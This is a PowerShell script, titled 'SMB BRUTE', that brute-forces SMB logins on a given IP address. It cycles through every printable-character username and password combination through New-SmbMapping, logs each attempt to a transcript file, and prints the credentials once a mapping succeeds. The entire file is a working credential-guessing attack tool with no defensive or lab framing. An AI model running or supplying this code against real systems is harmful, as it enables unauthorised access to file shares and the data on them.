param (
  [string]$IPAddr = $(throw "Need IP Address"),
  [int] $lb =33, # lower bound
  [int] $ub =126, # upper bound
  [int] $ml =1, # max length
  [int] $mli =1, # max length increment
  # Usernames can not contain   / \ [ ] : ; | = , + * ? < > %
  [int[]] $uc = (34, 47, 92, 91, 93, 58, 59, 124, 61, 44, 43, 42, 63, 60, 62, 37), # username constraints , chars that cant be used
  [int[]] $pc = 1 .. 31 #password constraints , chars that cant be used
) # TODO: Try - catch blocks, help?

# TODO: Add output file types XML, TXT, EXCEL
Start-Transcript -path "smbBrute_$(get-date -f dd.MM.yyyy_HH.mm.ss).txt"

Write-Host "**************************************************************************"
Write-Host "SMB BRUTE IS WORKING ON " $IPAddr " SELECTED PARAMS:"
Write-Host "LOWER BOUND FOR PASS: " $lb
Write-Host "UPPER BOUND FOR PASS: " $ub
Write-Host "INITIAL MAX LENGTH: " $ml
Write-Host "MAX LENGTH INCREMENT VALUE: " $mli
Write-Host "USERNAME CAN NOT CONTAIN: " $uc
Write-Host "PASSWORD CAN NOT CONTAIN: " $pc
Write-Host "**************************************************************************"
            
$OldMaxLength = 0

function updateList{
param ([int[]]$list, [bool] $isUsername)

for ($i = $list.Length-1; $i -ge 0 ; $i--){
    $list[$i] ++

    if ( ($isUsername -and $uc -contains $list[$i]) -or (!$isUsername -and $pc -contains $list[$i])){
        $i++ #process again
    }
    elseIf ( $list[$i] -gt $ub ){
        if ($i -ne 0 ){
            $list[$i] = $lb
        }
        else{
            [int[]]$list2 = ,$lb * ($list.Length+1)  # Increase the length and continue
            return $list2
        }
    }
    else {
        break
    }
}
return $list
}
function createString{
param ([int[]]$list)
$out = $null;
   for ($i = 0; $i -lt $list.Length ; $i++){
       $out+=[char]$list[$i] # display as an ASCII character
   }
   return $out
}
function brute {

[int[]]$userPtr =  $lb # username can not be space
[int[]]$passPtr =  0 # password can be null
$user = createString $userPtr #changes to String
$pass = createString $passPtr #changes to String
$Result = $null

#Continue till find a match
:outer while ($true) {

while ($userPtr.Length -le $ml) {

    while ($passPtr.Length -le $ml){ #check pass for this user
        $Result = New-SmbMapping -RemotePath $IPAddr -UserName $user -Password $pass -EA SilentlyContinue
           # TODO: Check if the server is on
        if ( $Result -ne $null ){
            Write-Host "SUCCESS -> UserPtr: " $userPtr "User:" $user "PassPtr: " $passPtr "Pass:" $pass
            Write-Host "**************************************************************************"
            Write-Host "BRUTE FORCING SMB CLIENT WORKED ON " $IPAddr "FOUND"
            Write-Host "USERNAME: " $user " PASSWORD:" $pass
            Write-Host "**************************************************************************"
            break outer
        }
        
        Write-Host "FAILED -> UserPtr: " $userPtr "User:" $user "PassPtr: " $passPtr "Pass:" $pass
        $passPtr = updateList $passPtr $false
        $pass = createString $passPtr
    }
    $userPtr = updateList $userPtr $true
    $user = createString $userPtr 
    if ( $OldMaxLength -eq 0 -or $userPtr.Length -gt $OldMaxLength) {
        $passPtr =  0 # needs to start from the beginning
    }
    else {
        $passPtr =   @($lb) * ($OldMaxLength+1)
    }
    $pass = createString $passPtr
}
$OldMaxLength = $ml
$ml += $mli
$userPtr = $lb
$user = createString $userPtr
$passPtr =  @($lb) * ($OldMaxLength+1) # No need to check previous with the same usernames, no need to check null anymore since there are other characters
$pass = createString $passPtr
}
}
brute

Stop-Transcript
